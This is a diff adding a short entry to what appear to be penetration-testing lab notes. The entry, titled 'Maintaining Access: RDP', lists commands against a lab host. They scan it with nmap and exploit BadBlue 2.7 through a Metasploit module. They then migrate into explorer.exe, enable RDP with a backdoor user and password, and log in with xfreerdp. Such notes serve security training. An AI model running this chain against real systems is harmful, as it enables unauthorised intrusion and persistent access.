@@ -2111,8 +2111,22 @@ reboot
 exit
 run
 ```
-
-
+111) Maintaining Access: RDP
+```
+cat /root/Desktop/target
+nmap 10.0.23.139
+nmap -sV -p 80 10.0.23.139
+searchsploit badblue 2.7
+msfconsole -q
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.23.139
+exploit
+getuid
+ps -S explorer.exe
+migrate 2764
+run getgui -e -u alice -p hack_123321
+xfreerdp /u:alice /p:hack_123321 /v:10.0.23.139
+```
 
 
 
